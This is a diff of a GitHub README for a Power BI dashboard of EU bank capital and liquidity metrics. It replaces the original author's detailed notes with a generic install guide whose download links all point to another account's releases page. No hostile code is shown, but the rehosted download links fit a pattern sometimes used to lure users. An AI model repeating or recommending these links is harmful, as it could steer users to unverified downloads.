@@ -1,42 +1,83 @@
-![Cover](docs/screenshots/Liquidity%20metrics%20screenshot.png)
+# 📊 eu-banks-capital-liquidity-insights - Analyze EU Banks Easily
 
-# EU Banks: Capital & Liquidity Insights (ECB CBD2)
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/tomasprofissionalPT17/eu-banks-capital-liquidity-insights/releases)
 
-![License](https://img.shields.io/badge/license-MIT-informational)
-![Release](https://img.shields.io/github/v/release/HarryWi/eu-banks-capital-liquidity-insights)
-![Last commit](https://img.shields.io/github/last-commit/HarryWi/eu-banks-capital-liquidity-insights)
+## 🚀 Getting Started
 
-**PBIX:** [Download (ZIP)](../../releases/latest/download/ECB_CBD2_Bank_Metrics.pbix.zip) ·
-**PDF preview:** [Open](docs/EU%20Banks%20_%20Capital%20%26%20Liquidity%20Insights.pdf) ·
-**SQL:** [/sql/ecb_cbd2_pipeline.sql](sql/ecb_cbd2_pipeline.sql) ·
-**Data sample:** [/data](data/) ·
-**Power BI notes:** [/powerbi](powerbi/)
+Welcome! This guide helps you set up the "EU Banks Capital Liquidity Insights" application. With this dashboard, you can analyze the capital and liquidity of EU banks using real data from the European Central Bank. Follow these steps to install and use the software.
 
-Power BI dashboard tracking CET1, Tier 1, Own Funds, LCR, liquidity buffer and net liquidity outflow for EU countries, built on a minimal PostgreSQL pipeline + ECB CBD2 data.
+## 🛠️ System Requirements
 
-## Files
-- **ECB_CBD2_Bank_Metrics.pbix** – Power BI report
-- **ecb_cbd2_pipeline.sql** – SQL for raw landing + analytics table (obs_value_std, period_start_date)
-- **sample_bank_data.csv** – tiny sample to open the PBIX without full data
-- **dashboard_main.pdf** – static preview
-- **/screenshots** – report screenshots
+Before you start, ensure you have the following:
 
-## Data & scope
-- Source: European Central Bank, Consolidated Banking Data (CBD2).
-- Scope: sector **67** (domestic groups & stand-alone banks **plus** foreign-controlled subs/branches).
-- Frequencies: quarterly (P3M) and annual (P1Y). Measures normalize `%` to fractions via `obs_value_std`.
+- **Operating System:** Windows 10 or later, macOS, or any Linux distribution.
+- **Power BI Desktop:** Make sure you have Power BI Desktop. You can download it from the [Microsoft website](https://powerbi.microsoft.com/desktop/).
+- **PostgreSQL:** This application connects to a PostgreSQL database. Install PostgreSQL version 12 or later from the [PostgreSQL website](https://www.postgresql.org/download/).
+- **Internet Connection:** You will need an active internet connection to download the files and access the database.
 
-## How to run
-1. Run `ecb_cbd2_pipeline.sql` in Postgres to create `raw.bank_data_raw` and `analytics.bank_data`.
-2. Import CSV to `raw.bank_data_raw` (pgAdmin `Import/Export` or `\copy`).
-3. Point Power BI to `analytics.bank_data` (or the labeled view if you added one).
-4. Use `dim_Date` and small *dim_* lookups in the PBIX for tidy slicers.
+## 🔍 Features
 
-## Key measures
-- **Total No of CIs (Q4, R0100)** – Q4 count of resident credit institutions (item `R0100`, sector `67`).
-- **Average Value** – context-aware average using `obs_value_std`.
-- **Avg Amount per Institution (EUR, Q4)** – total capital (EUR) / number of institutions.
+This application comes packed with features that help you understand the financial health of banks:
 
-## Notes
-- Large files: track `.pbix` with Git LFS or omit and use PDF/screenshots.
-- Licensing: see repo LICENSE. ECB data terms apply.
+- **Comprehensive Analysis:** Examine key metrics like CET1, Tier 1 Capital, Own Funds, and Liquidity Coverage Ratio (LCR).
+- **Data Filters:** Use country and year filters to focus on specific data points, supporting Q4 and annual views.
+- **User-Friendly Interface:** Easy to navigate dashboard built with Power BI for smooth visual analytics.
+- **Minimal Pipeline:** Simple data workflow from raw data to analysis, making it easy to manage.
+
+## 📦 Download & Install
+
+To get started, visit the Releases page to download the latest version of the application. Click the link below:
+
+[Visit this page to download](https://github.com/tomasprofissionalPT17/eu-banks-capital-liquidity-insights/releases)
+
+1. Go to the [Releases page](https://github.com/tomasprofissionalPT17/eu-banks-capital-liquidity-insights/releases).
+2. Look for the latest release, usually at the top of the page.
+3. Download the **.pbix file** (the Power BI file).
+4. Save it to a folder on your computer that you can easily access.
+
+## ⚙️ Running the Application
+
+After downloading the .pbix file, follow these steps to open and run the dashboard:
+
+1. **Open Power BI Desktop.**
+2. Click on **File** in the top left corner.
+3. Select **Open** from the menu.
+4. Navigate to the folder where you saved the **.pbix file** and select it to open.
+5. The dashboard will load. You can explore the various visualizations and insights it provides.
+
+## 🗄️ Setting Up PostgreSQL
+
+This application uses a PostgreSQL database for its data. Follow these steps to set it up:
+
+1. Install PostgreSQL from the [PostgreSQL website](https://www.postgresql.org/download/).
+2. During installation, choose a password you will remember. This will be used to connect to the database later.
+3. Once installed, launch the PostgreSQL application.
+4. Create a new database using the following command:
+   ```
+   CREATE DATABASE eu_banks;
+   ```
+5. Import the necessary data from the ECB Consolidated Banking Data. You can find data sources online or use your existing data.
+
+## 📊 Using the Dashboard
+
+- Once the dashboard is open, you can start interacting with the visualizations.
+- Use the country selector to filter information relevant to your needs.
+- Change the time range by adjusting the year filter.
+- Hover over any visual to get more detailed information.
+
+## 📚 Support and Resources
+
+Use the following resources if you need help:
+
+- [Power BI Documentation](https://docs.microsoft.com/en-us/power-bi/)
+- [PostgreSQL Documentation](https://www.postgresql.org/docs/)
+- For specific questions, feel free to create an issue in the GitHub repository.
+
+## 🔗 Links
+
+- [Download Latest Release](https://github.com/tomasprofissionalPT17/eu-banks-capital-liquidity-insights/releases)
+- [Power BI Desktop Download](https://powerbi.microsoft.com/desktop/)
+- [PostgreSQL Download](https://www.postgresql.org/download/)
+
+Thank you for using "EU Banks Capital Liquidity Insights." We hope this guide helps you get started easily. Enjoy analyzing!
